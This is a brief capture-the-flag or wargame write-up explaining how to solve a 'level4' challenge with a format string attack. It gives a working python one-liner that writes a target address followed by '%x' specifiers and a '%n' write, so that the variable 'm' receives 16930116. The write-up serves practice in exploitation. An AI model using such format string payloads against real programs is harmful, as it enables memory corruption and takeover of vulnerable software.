This level is almost the same as the previous level, instead of 64, we need to place the value 16930116 in the var "m".
This value is very big so we can not print as much as we need only with character, due to limit with fgets.
We will use the option 0 to print as much 0 to fill the gap and get the 16930116 printed characters.
python -c 'print "\x10\x98\x04\x08" + "%x"*9 + "%016930060f%n"'> /tmp/lvl4 && cat /tmp/lvl4 | ~/level4
